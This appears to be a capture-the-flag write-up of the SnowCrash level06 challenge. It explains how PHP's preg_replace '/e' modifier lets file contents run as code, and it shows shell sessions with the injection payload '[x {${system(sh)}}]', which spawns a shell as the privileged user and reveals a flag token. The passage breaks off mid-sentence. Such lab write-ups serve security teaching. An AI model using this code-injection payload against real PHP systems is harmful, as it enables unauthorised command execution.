### Exploit

This level, we're going to look at the potential vunerabilities of a PHP script. More specifically, that of the function [preg_replace](http://www.madirish.net/402). We are given two files to work with: a PHP script and an executable binary. Both appear to be rigourously the same. Let's break them down.

First off, the script takes two parameters which are called by function __x__. This function basically retrieves the content of the first argument via [file_get_contents](https://www.php.net/manual/en/function.file-get-contents.php) and prints it. So far, nothing too complicated. The next line is far more interesting.
> $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

Indeed, the '/e' modifier actually allows us to evaluate the second argument as a PHP expression. This means we could create a file whose content is to be interpreted and then executed by the script. For example:
```
    level06@SnowCrash:~$ echo "`ls -lah`" >/tmp/test
    level06@SnowCrash:~$ ./level06 /tmp/test
    total 24K
    dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
    d--x--x--x  1 root    users    340 Aug 30  2015 ..
    -r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
    -r-x------  1 level06 level06 3.5K Aug 30  2015 .bashrc
    -rwsr-x---+ 1 flag06  level06 7.4K Aug 30  2015 level06
    -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
    -r-x------  1 level06 level06  675 Apr  3  2012 .profile
```
Unfortunately, this won't work:
```
    level06@SnowCrash:~$ echo "`getflag`" >/tmp/test
    level06@SnowCrash:~$ ./level06 /tmp/test
    Check flag.Here is your token :
    Nope there is no token here for you sorry. Try again :)
```
We need to trick the script into thinking it executes `getflag` as `flag06`. More shell spawning anyone?

```
    level06@SnowCrash:~$ echo '[x {${system(sh)}}]' >/tmp/getflag
    level06@SnowCrash:~$ ./level06 /tmp/getflag
    PHP Notice:  Use of undefined constant sh - assumed 'sh' in /home/user/level06/level06.php(4) : regexp code on line 1
    getflag
    Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

This works because we are essentically...
